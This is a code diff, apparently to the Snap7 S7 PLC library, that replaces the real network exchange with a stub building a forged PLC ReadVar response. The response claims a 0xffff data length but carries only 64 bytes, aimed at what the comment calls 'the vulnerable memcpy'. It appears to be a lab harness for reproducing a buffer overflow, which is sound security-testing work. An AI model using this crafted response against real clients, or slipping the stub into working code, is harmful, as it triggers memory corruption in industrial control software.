@@ -1,0 +1,42 @@
+--- a/src/core/s7_isotcp.cpp
++++ b/src/core/s7_isotcp.cpp
+@@ -297,15 +297,32 @@
+ 	return Result;
+ }
+ //---------------------------------------------------------------------------
++#include "s7_types.h"
++word StubDataLength = 0xffff;
++byte StubFillByte = 0x48;
++
+ int TIsoTcpSocket::isoExchangeBuffer(void *Data, int &Size)
+ {
+-	int Result;
+-
+-    ClrIsoError();
+-	Result =isoSendBuffer(Data, Size);
+-	if (Result==0)
+-		Result =isoRecvBuffer(Data, Size);
+-	return Result;
++    (void)Data;
++    // Lab test double: synthesize a malicious PLC ReadVar answer directly in
++    // PDU.Payload. Upstream callers and the vulnerable memcpy are unchanged.
++    memset(&PDU, 0, sizeof(PDU));
++    PS7ResHeader23 Answer = PS7ResHeader23(&PDU.Payload);
++    Answer->P = 0x32;
++    Answer->PDUType = 0x03;
++    Answer->ParLen = SwapWord((word)2);
++    Answer->Error = 0;
++    PResFunReadParams Params = PResFunReadParams(pbyte(Answer) + ResHeaderSize23);
++    Params->FunRead = pduFuncRead;
++    Params->ItemCount = 1;
++    PResFunReadItem Item = PResFunReadItem(pbyte(Params) + sizeof(TResFunReadParams));
++    Item->ReturnCode = 0xff;
++    Item->TransportSize = TS_ResOctet;
++    Item->DataLength = SwapWord(StubDataLength);
++    for (int i = 0; i < 64; i++)
++        Item->Data[i] = StubFillByte;
++    Size = ResHeaderSize23 + sizeof(TResFunReadParams) + 4 + 64;
++    return 0;
+ }
+ //---------------------------------------------------------------------------
+ bool TIsoTcpSocket::IsoPDUReady()
